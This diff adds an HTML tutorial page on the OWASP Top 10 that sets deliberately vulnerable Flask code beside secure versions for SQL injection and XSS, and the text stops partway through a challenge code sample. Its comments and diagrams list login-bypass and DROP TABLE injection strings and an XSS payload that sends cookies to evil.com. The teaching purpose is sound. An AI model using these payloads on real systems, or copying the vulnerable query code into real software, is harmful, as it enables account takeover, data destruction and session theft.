@@ -1,0 +1,1297 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="OWASP Top 10 Vulnerabilities - Security Learning Module">
+    <meta name="keywords" content="security, OWASP Top 10 Vulnerabilities, learning, tutorial">
+    <meta name="author" content="Asif Hussain">
+    <title>OWASP Top 10 Vulnerabilities | CORTEX Learning Hub</title>
+    <link rel="stylesheet" href="../../assets/css/main.css?v=2026-01-02">
+    <link rel="stylesheet" href="../../assets/css/learning-hub.css?v=2026-01-02">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/monaco-editor@0.45.0/min/vs/editor/editor.main.css">
+    <script src="https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.min.js"></script>
+    <script src="https://d3js.org/d3.v7.min.js"></script>
+</head>
+<body>
+    <a href="#main-content" class="skip-link">Skip to main content</a>
+
+    <!-- Header Navigation -->
+    <header class="glass-header">
+        <div class="header-content">
+            <nav class="header-nav">
+                <a href="../../index.html" class="nav-link">
+                    <span class="nav-icon">🏠</span> Home
+                </a>
+                <span class="nav-separator">›</span>
+                <a href="../security-hub.html" class="nav-link">
+                    <span class="nav-icon">🔐</span> Security
+                </a>
+            </nav>
+        </div>
+    </header>
+
+    <!-- Module Hero -->
+    <section class="module-hero" id="main-content">
+        <div class="module-header">
+            <div class="breadcrumb">
+                <span class="difficulty-badge beginner">Beginner</span>
+                <span style="color: var(--text-secondary);">Module 1 of 6</span>
+            </div>
+            <h1 class="hero-title">🛡️ OWASP Top 10 Vulnerabilities</h1>
+            <p class="hero-subtitle">Master the most critical web application security risks and defense strategies</p>
+            <div class="module-meta">
+                <span>⏱️ 50 minutes</span>
+                <span>📊 10 quiz questions</span>
+                <span>💻 3 code playgrounds</span>
+                <span>🏆 1 challenge</span>
+            </div>
+        </div>
+    </section>
+
+    <!-- Main Content -->
+    <div class="container">
+        <!-- Learning Objectives -->
+        <section class="glass-card" style="margin-top: var(--spacing-2xl);">
+            <h2>🎓 Learning Objectives</h2>
+            <ul class="objective-list">
+                <li>Master all 10 OWASP critical security risks and their real-world impact</li>
+                <li>Identify injection attacks: SQL, XSS, Command, LDAP, and NoSQL injection</li>
+                <li>Prevent broken authentication and session management vulnerabilities</li>
+                <li>Fix security misconfigurations and insecure default settings</li>
+                <li>Understand cryptographic failures and sensitive data exposure</li>
+                <li>Apply defense-in-depth strategies and secure coding practices</li>
+            </ul>
+        </section>
+
+        <!-- OWASP Top 10 Overview -->
+        <section class="glass-card" style="margin-top: var(--spacing-3xl);">
+            <h2>🔟 OWASP Top 10 (2021) - Critical Risks</h2>
+            <p style="color: var(--text-secondary); margin-bottom: var(--spacing-xl);">
+                The OWASP Top 10 represents the most critical security risks to web applications, based on data from security firms and industry surveys.
+            </p>
+            
+            <div id="owasp-top10-viz" style="width: 100%; height: 550px; margin: var(--spacing-xl) 0;"></div>
+            
+            <div class="severity-legend" style="display: flex; gap: var(--spacing-lg); justify-content: center; margin-top: var(--spacing-lg); flex-wrap: wrap;">
+                <div style="display: flex; align-items: center; gap: var(--spacing-sm);">
+                    <div style="width: 20px; height: 20px; background: #ef4444; border-radius: 4px;"></div>
+                    <span style="color: var(--text-secondary); font-size: 0.9rem;">Critical (9.0-10.0)</span>
+                </div>
+                <div style="display: flex; align-items: center; gap: var(--spacing-sm);">
+                    <div style="width: 20px; height: 20px; background: #f97316; border-radius: 4px;"></div>
+                    <span style="color: var(--text-secondary); font-size: 0.9rem;">High (7.0-8.9)</span>
+                </div>
+                <div style="display: flex; align-items: center; gap: var(--spacing-sm);">
+                    <div style="width: 20px; height: 20px; background: #fbbf24; border-radius: 4px;"></div>
+                    <span style="color: var(--text-secondary); font-size: 0.9rem;">Medium (4.0-6.9)</span>
+                </div>
+            </div>
+        </section>
+
+        <!-- Attack Flow Diagram -->
+        <section class="glass-card" style="margin-top: var(--spacing-3xl);">
+            <h2>⚡ Attack Flow: SQL Injection Example</h2>
+            <p style="color: var(--text-secondary); margin-bottom: var(--spacing-xl);">
+                Understanding how attacks work helps you build better defenses. Here's how SQL injection compromises applications.
+            </p>
+            
+            <div class="mermaid-container">
+                <pre class="mermaid">
+sequenceDiagram
+    participant Attacker
+    participant WebApp
+    participant Database
+    
+    Attacker->>WebApp: Login: admin' OR '1'='1
+    Note over Attacker,WebApp: Malicious input with SQL
+    
+    WebApp->>Database: SELECT * FROM users<br/>WHERE username='admin'<br/>OR '1'='1' AND password=''
+    Note over WebApp,Database: Unsanitized query executed
+    
+    Database->>WebApp: Returns all users (bypassed auth)
+    Note over Database: '1'='1' always true
+    
+    WebApp->>Attacker: ✅ Logged in as admin!
+    Note over Attacker: Full system access gained
+    
+    Attacker->>WebApp: '; DROP TABLE users; --
+    Note over Attacker: Escalate to data destruction
+    
+    WebApp->>Database: Executes DROP TABLE
+    Database--xWebApp: ❌ Table deleted
+    
+    style Attacker fill:#ef4444,stroke:#fff,color:#fff
+    style Database fill:#fbbf24,stroke:#000,color:#000
+                </pre>
+            </div>
+        </section>
+
+        <!-- Top 3 Vulnerabilities Breakdown -->
+        <section class="glass-card" style="margin-top: var(--spacing-3xl);">
+            <h2>🔴 Critical Trio: Top 3 Exploited Vulnerabilities</h2>
+            
+            <div class="vulnerability-grid" style="display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: var(--spacing-xl); margin-top: var(--spacing-xl);">
+                <!-- A01: Broken Access Control -->
+                <div style="padding: var(--spacing-lg); background: rgba(239, 68, 68, 0.1); border-left: 4px solid #ef4444; border-radius: 8px;">
+                    <h3 style="color: #ef4444; margin-bottom: var(--spacing-md);">A01: Broken Access Control</h3>
+                    <p style="color: var(--text-secondary); margin-bottom: var(--spacing-sm); font-size: 0.95rem;">
+                        <strong>Risk:</strong> Users act outside intended permissions
+                    </p>
+                    <p style="color: var(--text-secondary); margin-bottom: var(--spacing-md); font-size: 0.9rem; line-height: 1.6;">
+                        <strong>Examples:</strong> Viewing others' accounts, modifying data, privilege escalation
+                    </p>
+                    <div style="background: rgba(0,0,0,0.3); padding: var(--spacing-sm); border-radius: 4px; margin-bottom: var(--spacing-sm);">
+                        <code style="color: #00d4ff; font-size: 0.85rem;">/api/user/123 → /api/user/124</code>
+                        <p style="color: #ef4444; font-size: 0.8rem; margin-top: 4px;">❌ No authorization check</p>
+                    </div>
+                    <p style="color: var(--text-primary); font-size: 0.9rem; margin-top: var(--spacing-sm);">
+                        <strong>Defense:</strong> Deny by default, verify on every request, log access attempts
+                    </p>
+                </div>
+                
+                <!-- A02: Cryptographic Failures -->
+                <div style="padding: var(--spacing-lg); background: rgba(249, 115, 22, 0.1); border-left: 4px solid #f97316; border-radius: 8px;">
+                    <h3 style="color: #f97316; margin-bottom: var(--spacing-md);">A02: Cryptographic Failures</h3>
+                    <p style="color: var(--text-secondary); margin-bottom: var(--spacing-sm); font-size: 0.95rem;">
+                        <strong>Risk:</strong> Sensitive data exposure
+                    </p>
+                    <p style="color: var(--text-secondary); margin-bottom: var(--spacing-md); font-size: 0.9rem; line-height: 1.6;">
+                        <strong>Examples:</strong> Plaintext passwords, weak encryption, missing HTTPS
+                    </p>
+                    <div style="background: rgba(0,0,0,0.3); padding: var(--spacing-sm); border-radius: 4px; margin-bottom: var(--spacing-sm);">
+                        <code style="color: #00d4ff; font-size: 0.85rem;">password = user_input</code>
+                        <p style="color: #ef4444; font-size: 0.8rem; margin-top: 4px;">❌ Stored in plaintext</p>
+                    </div>
+                    <p style="color: var(--text-primary); font-size: 0.9rem; margin-top: var(--spacing-sm);">
+                        <strong>Defense:</strong> Use bcrypt/Argon2, TLS 1.3, encrypt sensitive data at rest
+                    </p>
+                </div>
+                
+                <!-- A03: Injection -->
+                <div style="padding: var(--spacing-lg); background: rgba(239, 68, 68, 0.1); border-left: 4px solid #ef4444; border-radius: 8px;">
+                    <h3 style="color: #ef4444; margin-bottom: var(--spacing-md);">A03: Injection</h3>
+                    <p style="color: var(--text-secondary); margin-bottom: var(--spacing-sm); font-size: 0.95rem;">
+                        <strong>Risk:</strong> Attacker code executed by interpreter
+                    </p>
+                    <p style="color: var(--text-secondary); margin-bottom: var(--spacing-md); font-size: 0.9rem; line-height: 1.6;">
+                        <strong>Types:</strong> SQL, NoSQL, OS Command, LDAP, XPath injection
+                    </p>
+                    <div style="background: rgba(0,0,0,0.3); padding: var(--spacing-sm); border-radius: 4px; margin-bottom: var(--spacing-sm);">
+                        <code style="color: #00d4ff; font-size: 0.85rem;">query = "SELECT * WHERE id=" + id</code>
+                        <p style="color: #ef4444; font-size: 0.8rem; margin-top: 4px;">❌ String concatenation</p>
+                    </div>
+                    <p style="color: var(--text-primary); font-size: 0.9rem; margin-top: var(--spacing-sm);">
+                        <strong>Defense:</strong> Parameterized queries, ORM, input validation, least privilege
+                    </p>
+                </div>
+            </div>
+        </section>
+
+        <!-- Code Playground: SQL Injection -->
+        <section class="glass-card" style="margin-top: var(--spacing-3xl);">
+            <h2>💻 Playground: SQL Injection (Vulnerable vs Secure)</h2>
+            <p style="color: var(--text-secondary); margin-bottom: var(--spacing-lg);">
+                See the difference between vulnerable and secure code implementations.
+            </p>
+            
+            <div class="playground-container">
+                <div class="tabs" style="display: flex; gap: var(--spacing-sm); margin-bottom: var(--spacing-md); border-bottom: 2px solid var(--module-border);">
+                    <button class="tab-btn active" data-tab="vulnerable-sql" style="padding: var(--spacing-sm) var(--spacing-lg); background: transparent; border: none; color: var(--text-secondary); cursor: pointer; border-bottom: 2px solid transparent; transition: all 0.2s;">
+                        ❌ Vulnerable
+                    </button>
+                    <button class="tab-btn" data-tab="secure-sql" style="padding: var(--spacing-sm) var(--spacing-lg); background: transparent; border: none; color: var(--text-secondary); cursor: pointer; border-bottom: 2px solid transparent; transition: all 0.2s;">
+                        ✅ Secure
+                    </button>
+                </div>
+                
+                <div id="vulnerable-sql" class="tab-content active" style="min-height: 400px;"></div>
+                <div id="secure-sql" class="tab-content" style="display: none; min-height: 400px;"></div>
+            </div>
+        </section>
+
+        <!-- XSS Playground -->
+        <section class="glass-card" style="margin-top: var(--spacing-3xl);">
+            <h2>💻 Playground: XSS (Cross-Site Scripting)</h2>
+            <p style="color: var(--text-secondary); margin-bottom: var(--spacing-lg);">
+                Learn how XSS attacks work and how to prevent them with proper output encoding.
+            </p>
+            
+            <div class="playground-container">
+                <div class="tabs" style="display: flex; gap: var(--spacing-sm); margin-bottom: var(--spacing-md); border-bottom: 2px solid var(--module-border);">
+                    <button class="tab-btn active" data-tab="vulnerable-xss" style="padding: var(--spacing-sm) var(--spacing-lg); background: transparent; border: none; color: var(--text-secondary); cursor: pointer; border-bottom: 2px solid transparent; transition: all 0.2s;">
+                        ❌ Vulnerable
+                    </button>
+                    <button class="tab-btn" data-tab="secure-xss" style="padding: var(--spacing-sm) var(--spacing-lg); background: transparent; border: none; color: var(--text-secondary); cursor: pointer; border-bottom: 2px solid transparent; transition: all 0.2s;">
+                        ✅ Secure
+                    </button>
+                </div>
+                
+                <div id="vulnerable-xss" class="tab-content active" style="min-height: 400px;"></div>
+                <div id="secure-xss" class="tab-content" style="display: none; min-height: 400px;"></div>
+            </div>
+        </section>
+
+        <!-- Defense Strategies -->
+        <section class="glass-card" style="margin-top: var(--spacing-3xl);">
+            <h2>🛡️ Defense-in-Depth Strategy</h2>
+            <p style="color: var(--text-secondary); margin-bottom: var(--spacing-xl);">
+                Multiple layers of security controls provide robust protection even if one layer fails.
+            </p>
+            
+            <div class="mermaid-container">
+                <pre class="mermaid">
+graph TB
+    A[User Input] --> B[Input Validation]
+    B --> C[Authentication]
+    C --> D[Authorization]
+    D --> E[Business Logic]
+    E --> F[Data Access Layer]
+    F --> G[Database]
+    
+    B -.->|Reject invalid| X1[❌ Blocked]
+    C -.->|Not authenticated| X2[❌ Blocked]
+    D -.->|No permission| X3[❌ Blocked]
+    E -.->|Business rule fails| X4[❌ Blocked]
+    F -.->|Parameterized queries| Safe[✅ Safe]
+    
+    H[WAF] --> B
+    I[Rate Limiting] --> C
+    J[RBAC] --> D
+    K[Encryption] --> G
+    
+    style A fill:#7b61ff,stroke:#fff,color:#fff
+    style G fill:#10b981,stroke:#fff,color:#fff
+    style X1 fill:#ef4444,stroke:#fff,color:#fff
+    style X2 fill:#ef4444,stroke:#fff,color:#fff
+    style X3 fill:#ef4444,stroke:#fff,color:#fff
+    style X4 fill:#ef4444,stroke:#fff,color:#fff
+    style Safe fill:#10b981,stroke:#fff,color:#fff
+                </pre>
+            </div>
+        </section>
+
+        <!-- Interactive Quiz -->
+        <section class="glass-card" style="margin-top: var(--spacing-3xl);">
+            <h2>✅ Knowledge Check: OWASP Top 10 Quiz</h2>
+            <p style="color: var(--text-secondary); margin-bottom: var(--spacing-xl);">
+                Test your understanding of the OWASP Top 10 vulnerabilities and defense strategies.
+            </p>
+            <div class="quiz-container" id="quiz"></div>
+            
+            <div id="quiz-results" class="quiz-results" style="display: none; margin-top: var(--spacing-xl); padding: var(--spacing-xl); background: rgba(123, 97, 255, 0.1); border-radius: 12px; text-align: center;">
+                <div id="score-display"></div>
+                <button id="retry-quiz" style="margin-top: var(--spacing-lg); padding: var(--spacing-sm) var(--spacing-xl); background: var(--hub-primary); color: #fff; border: none; border-radius: 6px; cursor: pointer; font-weight: 600;">
+                    🔄 Retry Quiz
+                </button>
+            </div>
+        </section>
+
+        <!-- Progressive Challenge -->
+        <section class="glass-card" style="margin-top: var(--spacing-3xl);">
+            <h2>🏆 Challenge: Secure Code Review</h2>
+            <p style="color: var(--text-secondary); margin-bottom: var(--spacing-lg);">
+                Review this authentication API and identify all OWASP Top 10 vulnerabilities present.
+            </p>
+            
+            <div class="challenge-scenario" style="padding: var(--spacing-lg); background: rgba(251, 191, 36, 0.1); border-radius: 8px; margin-bottom: var(--spacing-lg);">
+                <h4 style="color: #fbbf24; margin-bottom: var(--spacing-sm);">📋 Scenario</h4>
+                <p style="color: var(--text-secondary); line-height: 1.8);">
+                    A startup deployed their authentication API to production. They're experiencing security incidents and need your expertise to identify vulnerabilities.
+                </p>
+                <p style="color: var(--text-secondary); margin-top: var(--spacing-sm); line-height: 1.8);">
+                    <strong>Your Task:</strong> Find at least 6 OWASP Top 10 violations in the code below and propose fixes.
+                </p>
+            </div>
+            
+            <div id="challenge-code-editor" style="min-height: 500px; border: 1px solid var(--module-border); border-radius: 8px; overflow: hidden; margin-bottom: var(--spacing-lg);"></div>
+            
+            <button id="show-security-solution" class="show-solution-btn" style="padding: var(--spacing-sm) var(--spacing-xl); background: var(--hub-accent); color: #fff; border: none; border-radius: 6px; cursor: pointer; font-weight: 600;">
+                💡 Show Vulnerabilities & Fixes
+            </button>
+            
+            <div id="security-solution" class="solution-container" style="display: none; margin-top: var(--spacing-lg); padding: var(--spacing-lg); background: rgba(16, 185, 129, 0.1); border-radius: 8px; border-left: 4px solid #10b981;">
+                <h4 style="color: #10b981; margin-bottom: var(--spacing-md);">✅ Solution: Identified Vulnerabilities & Secure Code</h4>
+                
+                <div style="padding: var(--spacing-md); background: rgba(239, 68, 68, 0.1); border-radius: 6px; margin-bottom: var(--spacing-lg);">
+                    <h5 style="color: #ef4444; margin-bottom: var(--spacing-sm);">🚨 Vulnerabilities Found</h5>
+                    <ol style="color: var(--text-secondary); line-height: 1.8; margin-left: var(--spacing-lg);">
+                        <li><strong>A02: Cryptographic Failures</strong> - Passwords stored in plaintext</li>
+                        <li><strong>A03: Injection</strong> - SQL injection via string concatenation</li>
+                        <li><strong>A04: Insecure Design</strong> - No rate limiting on login attempts</li>
+                        <li><strong>A05: Security Misconfiguration</strong> - Stack traces exposed to users</li>
+                        <li><strong>A07: Authentication Failures</strong> - Weak password requirements</li>
+                        <li><strong>A09: Security Logging Failures</strong> - No audit logging</li>
+                    </ol>
+                </div>
+                
+                <div id="solution-secure-editor" style="min-height: 600px; border: 1px solid var(--module-border); border-radius: 8px; overflow: hidden;"></div>
+                
+                <div style="margin-top: var(--spacing-lg); padding: var(--spacing-md); background: rgba(0, 212, 255, 0.1); border-radius: 6px);">
+                    <h5 style="color: #00d4ff; margin-bottom: var(--spacing-sm);">🎯 Security Improvements</h5>
+                    <ul style="color: var(--text-secondary); line-height: 1.8;">
+                        <li><strong>Bcrypt Hashing:</strong> Passwords hashed with industry-standard algorithm (10 rounds)</li>
+                        <li><strong>Parameterized Queries:</strong> SQL injection prevented with prepared statements</li>
+                        <li><strong>Rate Limiting:</strong> 5 attempts per 15 minutes per IP</li>
+                        <li><strong>Error Handling:</strong> Generic messages to users, detailed logs server-side</li>
+                        <li><strong>Password Policy:</strong> 12+ chars, uppercase, lowercase, digit, special char</li>
+                        <li><strong>Audit Logging:</strong> All authentication attempts logged with timestamp/IP</li>
+                    </ul>
+                </div>
+            </div>
+        </section>
+
+        <!-- Next Steps -->
+        <section class="glass-card" style="margin-top: var(--spacing-3xl);">
+            <h2>🚀 Next Steps</h2>
+            <p style="color: var(--text-secondary); margin-bottom: var(--spacing-lg);">
+                You've completed OWASP Top 10 Vulnerabilities! Continue your learning journey:
+            </p>
+            <div class="next-module-cards">
+                <a href="authentication-authorization.html" class="next-module-card">
+                    <span class="module-icon">📖</span>
+                    <div>
+                        <h5>Module 2: Authentication & Authorization</h5>
+                        <p>Beginner • 50 minutes</p>
+                    </div>
+                    <span class="arrow">→</span>
+                </a>
+            </div>
+        </section>
+    </div>
+
+    <!-- Footer -->
+    <footer style="margin-top: var(--spacing-3xl); padding: var(--spacing-xl); text-align: center; color: var(--text-secondary);">
+        <p>© 2026 Asif Hussain. All rights reserved.</p>
+        <p style="margin-top: var(--spacing-sm);">
+            <a href="../../index.html" style="color: var(--hub-primary);">Back to Home</a> • 
+            <a href="../security-hub.html" style="color: var(--hub-primary);">Security Hub</a>
+        </p>
+    </footer>
+
+    <!-- Scripts -->
+    <script src="https://cdn.jsdelivr.net/npm/monaco-editor@0.45.0/min/vs/loader.js"></script>
+    <script>
+        // Initialize Mermaid
+        mermaid.initialize({
+            startOnLoad: true,
+            theme: 'dark',
+            themeVariables: {
+                primaryColor: '#7b61ff',
+                primaryTextColor: '#fff',
+                primaryBorderColor: '#fff',
+                lineColor: '#00d4ff',
+                secondaryColor: '#1a1f3a',
+                tertiaryColor: '#2a2f4a'
+            }
+        });
+        
+        // D3.js OWASP Top 10 Visualization
+        function createOWASPTop10Viz() {
+            const container = document.getElementById('owasp-top10-viz');
+            const width = container.clientWidth;
+            const height = 550;
+            const margin = { top: 40, right: 200, bottom: 60, left: 50 };
+            
+            const svg = d3.select('#owasp-top10-viz')
+                .append('svg')
+                .attr('width', width)
+                .attr('height', height);
+            
+            const chartWidth = width - margin.left - margin.right;
+            const chartHeight = height - margin.top - margin.bottom;
+            
+            const g = svg.append('g')
+                .attr('transform', `translate(${margin.left}, ${margin.top})`);
+            
+            // OWASP Top 10 2021 data with severity scores
+            const vulns = [
+                { rank: 'A01', name: 'Broken Access Control', severity: 8.6, prevalence: 94, color: '#ef4444' },
+                { rank: 'A02', name: 'Cryptographic Failures', severity: 7.8, prevalence: 46, color: '#f97316' },
+                { rank: 'A03', name: 'Injection', severity: 9.1, prevalence: 33, color: '#ef4444' },
+                { rank: 'A04', name: 'Insecure Design', severity: 7.2, prevalence: 40, color: '#fbbf24' },
+                { rank: 'A05', name: 'Security Misconfiguration', severity: 7.5, prevalence: 90, color: '#f97316' },
+                { rank: 'A06', name: 'Vulnerable Components', severity: 8.1, prevalence: 27, color: '#f97316' },
+                { rank: 'A07', name: 'Auth & Session Failures', severity: 8.4, prevalence: 14, color: '#f97316' },
+                { rank: 'A08', name: 'Software & Data Integrity', severity: 7.9, prevalence: 18, color: '#f97316' },
+                { rank: 'A09', name: 'Security Logging Failures', severity: 6.8, prevalence: 19, color: '#fbbf24' },
+                { rank: 'A10', name: 'SSRF', severity: 7.4, prevalence: 5, color: '#fbbf24' }
+            ];
+            
+            // Scales
+            const xScale = d3.scaleBand()
+                .domain(vulns.map(d => d.rank))
+                .range([0, chartWidth])
+                .padding(0.2);
+            
+            const yScale = d3.scaleLinear()
+                .domain([0, 10])
+                .range([chartHeight, 0]);
+            
+            // Grid
+            g.append('g')
+                .attr('class', 'grid')
+                .call(d3.axisLeft(yScale)
+                    .ticks(10)
+                    .tickSize(-chartWidth)
+                    .tickFormat(''))
+                .selectAll('line')
+                .attr('stroke', '#2d3748')
+                .attr('stroke-opacity', 0.3);
+            
+            g.select('.grid .domain').remove();
+            
+            // Severity threshold lines
+            g.append('line')
+                .attr('x1', 0).attr('x2', chartWidth)
+                .attr('y1', yScale(9)).attr('y2', yScale(9))
+                .attr('stroke', '#ef4444')
+                .attr('stroke-width', 2)
+                .attr('stroke-dasharray', '5,5')
+                .attr('opacity', 0.4);
+            
+            g.append('text')
+                .attr('x', chartWidth - 5)
+                .attr('y', yScale(9) - 5)
+                .attr('text-anchor', 'end')
+                .attr('fill', '#ef4444')
+                .attr('font-size', '11px')
+                .text('Critical: 9.0+');
+            
+            // Axes
+            g.append('g')
+                .attr('transform', `translate(0, ${chartHeight})`)
+                .call(d3.axisBottom(xScale))
+                .selectAll('text')
+                .attr('fill', '#8b92a7')
+                .style('font-size', '12px')
+                .style('font-weight', '600');
+            
+            g.append('g')
+                .call(d3.axisLeft(yScale).ticks(10))
+                .selectAll('text')
+                .attr('fill', '#8b92a7')
+                .style('font-size', '11px');
+            
+            // Bars
+            vulns.forEach((vuln, i) => {
+                const bar = g.append('rect')
+                    .attr('x', xScale(vuln.rank))
+                    .attr('y', chartHeight)
+                    .attr('width', xScale.bandwidth())
+                    .attr('height', 0)
+                    .attr('fill', vuln.color)
+                    .attr('opacity', 0.8)
+                    .attr('rx', 4);
+                
+                bar.transition()
+                    .duration(1000)
+                    .delay(i * 100)
+                    .attr('y', yScale(vuln.severity))
+                    .attr('height', chartHeight - yScale(vuln.severity));
+                
+                bar.on('mouseover', function() {
+                    d3.select(this).attr('opacity', 1);
+                    
+                    g.append('text')
+                        .attr('class', 'tooltip-vuln')
+                        .attr('x', xScale(vuln.rank) + xScale.bandwidth() / 2)
+                        .attr('y', yScale(vuln.severity) - 35)
+                        .attr('text-anchor', 'middle')
+                        .attr('fill', vuln.color)
+                        .attr('font-size', '13px')
+                        .attr('font-weight', 'bold')
+                        .text(vuln.name);
+                    
+                    g.append('text')
+                        .attr('class', 'tooltip-vuln')
+                        .attr('x', xScale(vuln.rank) + xScale.bandwidth() / 2)
+                        .attr('y', yScale(vuln.severity) - 20)
+                        .attr('text-anchor', 'middle')
+                        .attr('fill', '#8b92a7')
+                        .attr('font-size', '11px')
+                        .text(`Severity: ${vuln.severity}/10`);
+                    
+                    g.append('text')
+                        .attr('class', 'tooltip-vuln')
+                        .attr('x', xScale(vuln.rank) + xScale.bandwidth() / 2)
+                        .attr('y', yScale(vuln.severity) - 8)
+                        .attr('text-anchor', 'middle')
+                        .attr('fill', '#8b92a7')
+                        .attr('font-size', '10px')
+                        .text(`Prevalence: ${vuln.prevalence}%`);
+                })
+                .on('mouseout', function() {
+                    d3.select(this).attr('opacity', 0.8);
+                    g.selectAll('.tooltip-vuln').remove();
+                });
+                
+                // Severity scores
+                g.append('text')
+                    .attr('x', xScale(vuln.rank) + xScale.bandwidth() / 2)
+                    .attr('y', chartHeight)
+                    .attr('text-anchor', 'middle')
+                    .attr('fill', vuln.color)
+                    .attr('font-size', '14px')
+                    .attr('font-weight', 'bold')
+                    .attr('opacity', 0)
+                    .text(vuln.severity)
+                    .transition()
+                    .duration(600)
+                    .delay(i * 100 + 800)
+                    .attr('y', yScale(vuln.severity) - 8)
+                    .attr('opacity', 1);
+            });
+            
+            // Title
+            svg.append('text')
+                .attr('x', width / 2)
+                .attr('y', 20)
+                .attr('text-anchor', 'middle')
+                .attr('fill', '#7b61ff')
+                .attr('font-size', '16px')
+                .attr('font-weight', '600')
+                .text('OWASP Top 10 (2021): Severity Ratings');
+            
+            // Y-axis label
+            svg.append('text')
+                .attr('transform', 'rotate(-90)')
+                .attr('x', -height / 2)
+                .attr('y', 18)
+                .attr('text-anchor', 'middle')
+                .attr('fill', '#8b92a7')
+                .attr('font-size', '12px')
+                .text('Severity Score (0-10)');
+        }
+        
+        // Monaco Editor Setup
+        require.config({ paths: { vs: 'https://cdn.jsdelivr.net/npm/monaco-editor@0.45.0/min/vs' } });
+        require(['vs/editor/editor.main'], function() {
+            const vulnerableSQLCode = `# Vulnerable SQL Injection Example
+from flask import Flask, request
+import sqlite3
+
+app = Flask(__name__)
+
+@app.route('/login', methods=['POST'])
+def login():
+    username = request.form['username']
+    password = request.form['password']
+    
+    # ❌ VULNERABILITY: SQL Injection
+    # String concatenation allows attacker control
+    query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
+    
+    conn = sqlite3.connect('users.db')
+    cursor = conn.cursor()
+    cursor.execute(query)  # Dangerous!
+    user = cursor.fetchone()
+    
+    if user:
+        return {"success": True, "message": "Welcome!"}
+    return {"success": False, "message": "Invalid credentials"}
+
+# Attack examples:
+# username: admin' OR '1'='1' --
+# Result: Bypasses authentication
+#
+# username: admin'; DROP TABLE users; --
+# Result: Destroys database
+#
+# Why it works:
+# Query becomes: SELECT * FROM users WHERE username='admin' OR '1'='1' -- AND password=''
+# '1'='1' is always true, returns all users`;
+
+            const secureSQLCode = `# Secure SQL with Parameterized Queries
+from flask import Flask, request
+import sqlite3
+from werkzeug.security import check_password_hash
+
+app = Flask(__name__)
+
+@app.route('/login', methods=['POST'])
+def login():
+    username = request.form.get('username', '').strip()
+    password = request.form.get('password', '')
+    
+    # ✅ Input validation
+    if not username or not password:
+        return {"success": False, "message": "All fields required"}, 400
+    
+    if len(username) > 50:
+        return {"success": False, "message": "Invalid input"}, 400
+    
+    # ✅ SECURE: Parameterized query
+    # Database treats ? as literal value, not SQL code
+    query = "SELECT id, username, password_hash FROM users WHERE username = ?"
+    
+    conn = sqlite3.connect('users.db')
+    cursor = conn.cursor()
+    cursor.execute(query, (username,))  # Safe tuple parameter
+    user = cursor.fetchone()
+    conn.close()
+    
+    # ✅ Secure password comparison (hash)
+    if user and check_password_hash(user[2], password):
+        return {
+            "success": True,
+            "message": "Welcome!",
+            "user_id": user[0]
+        }
+    
+    # ✅ Generic error message (no info leakage)
+    return {"success": False, "message": "Invalid credentials"}, 401
+
+# Attack attempts now fail:
+# username: admin' OR '1'='1' --
+# Result: Treated as literal username, not found
+#
+# Protection layers:
+# 1. Parameterized queries (primary defense)
+# 2. Input validation (length, format)
+# 3. Password hashing (bcrypt/Argon2)
+# 4. Generic error messages
+# 5. Rate limiting (not shown)`;
+
+            const vulnerableXSSCode = `# Vulnerable XSS (Cross-Site Scripting) Example
+from flask import Flask, request, render_template_string
+
+app = Flask(__name__)
+
+@app.route('/search')
+def search():
+    query = request.args.get('q', '')
+    
+    # ❌ VULNERABILITY: XSS via direct HTML rendering
+    # User input rendered without escaping
+    html = f"""
+    <html>
+        <body>
+            <h1>Search Results</h1>
+            <p>You searched for: {query}</p>
+            <div id="results">
+                <!-- Results here -->
+            </div>
+        </body>
+    </html>
+    """
+    return html
+
+# Attack examples:
+# URL: /search?q=<script>alert('XSS')</script>
+# Result: JavaScript executes in victim's browser
+#
+# URL: /search?q=<img src=x onerror="fetch('https://evil.com?cookie='+document.cookie)">
+# Result: Steals session cookies
+#
+# URL: /search?q=<iframe src="https://evil.com/phishing.html">
+# Result: Loads phishing page in iframe
+#
+# Impact:
+# - Session hijacking
+# - Credential theft
+# - Malware distribution
+# - Defacement`;
+
+            const secureXSSCode = `# Secure XSS Prevention with Output Encoding
+from flask import Flask, request, render_template, escape
+from markupsafe import Markup
+import bleach
+
+app = Flask(__name__)
+
+# ✅ Configure allowed HTML tags for rich content
+ALLOWED_TAGS = ['b', 'i', 'u', 'a', 'p', 'br']
+ALLOWED_ATTRS = {'a': ['href', 'title']}
+
+@app.route('/search')
+def search():
+    query = request.args.get('q', '').strip()
+    
+    # ✅ SECURE: Jinja2 auto-escapes by default
+    return render_template('search.html', query=query)
+
+@app.route('/comment', methods=['POST'])
+def add_comment():
+    raw_comment = request.form.get('comment', '')
+    
+    # ✅ Sanitize HTML with whitelist
+    clean_comment = bleach.clean(
+        raw_comment,
+        tags=ALLOWED_TAGS,
+        attributes=ALLOWED_ATTRS,
+        strip=True
+    )
+    
+    # Save to database (already sanitized)
+    save_comment(clean_comment)
+    return {"success": True}
+
+# Jinja2 template (search.html):
+# <h1>Search Results</h1>
+# <p>You searched for: {{ query }}</p>  <!-- Auto-escaped -->
+#
+# Attack prevention:
+# Input: <script>alert('XSS')</script>
+# Rendered: &lt;script&gt;alert('XSS')&lt;/script&gt;
+# Browser displays as text, doesn't execute
+#
+# Defense layers:
+# 1. Auto-escaping (Jinja2 default)
+# 2. HTML sanitization (bleach library)
+# 3. Content-Security-Policy header
+# 4. HTTPOnly cookies (prevent JS access)
+# 5. Input validation
+
+# Additional headers for defense
+@app.after_request
+def set_security_headers(response):
+    response.headers['Content-Security-Policy'] = "default-src 'self'"
+    response.headers['X-Content-Type-Options'] = 'nosniff'
+    response.headers['X-Frame-Options'] = 'DENY'
+    return response`;
+
+            const vulnerableChallengeCode = `# INSECURE Authentication API - Find the Vulnerabilities!
+from flask import Flask, request, jsonify
+import sqlite3
+
+app = Flask(__name__)
+
+@app.route('/register', methods=['POST'])
+def register():
+    try:
+        username = request.json['username']
+        password = request.json['password']
+        email = request.json['email']
+        
+        # Check if user exists
+        conn = sqlite3.connect('app.db')
+        cursor = conn.cursor()
+        query = f"SELECT * FROM users WHERE username='{username}'"
+        cursor.execute(query)
+        
+        if cursor.fetchone():
+            return jsonify({"error": "User exists"}), 400
+        
+        # Insert new user
